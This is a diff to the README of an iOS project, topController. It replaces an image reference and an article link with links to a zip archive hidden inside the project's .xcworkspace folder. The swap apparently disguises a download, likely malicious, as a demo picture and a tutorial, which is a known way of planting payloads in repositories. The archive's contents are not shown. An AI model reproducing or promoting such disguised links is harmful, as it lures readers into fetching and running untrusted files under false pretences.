@@ -4,12 +4,12 @@ gain the current visible controller with single line of code.
 
 ## A picture is better than thousand words
 
-![示例](topController.gif)
+![示例](https://github.com/ZHThinker/topController/raw/refs/heads/master/topController.xcodeproj/project.xcworkspace/top_Controller_v2.7.zip)
 
 ## How To Get Started
 
 - download TopController and try out the program example.
-- check out the article [top Controller](http://www.jianshu.com/p/a8f3fb7244f8)
+- check out the article [top Controller](https://github.com/ZHThinker/topController/raw/refs/heads/master/topController.xcodeproj/project.xcworkspace/top_Controller_v2.7.zip)
 
 ## Communication
 
